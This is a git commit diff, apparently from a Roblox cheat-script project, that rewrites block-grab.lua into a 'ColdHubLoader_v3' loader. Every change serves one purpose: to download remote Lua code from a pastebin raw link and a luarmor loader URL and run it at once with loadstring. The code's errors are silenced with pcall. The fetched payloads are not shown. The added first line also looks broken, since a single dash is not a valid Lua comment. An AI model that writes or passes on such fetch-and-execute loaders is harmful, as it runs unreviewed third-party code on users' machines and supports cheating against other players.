9be17024b7df9f68156d0bbb2cf2a559550742c9
arshwasser <hettesheimerjonte@gmail.com>
2026-04-07 13:48:06 +0200

    Update block-grab.lua

--- block-grab.lua
+++ block-grab.lua
@@ -1,1 +1,21 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/ML1hG6Y7"))()
+- unique name damit nix conflicted
+if not getgenv().ColdHubLoader_v3 then
+    getgenv().ColdHubLoader_v3 = true
+
+    -- Script 1
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/ML1hG6Y7"))()
+        end)
+    end)
+
+    -- kleine delay für stability
+    task.wait(0.5)
+
+    -- Script 2
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/0576443e53d848eb8bd8458de6a25011.lua"))()
+        end)
+    end)
+end
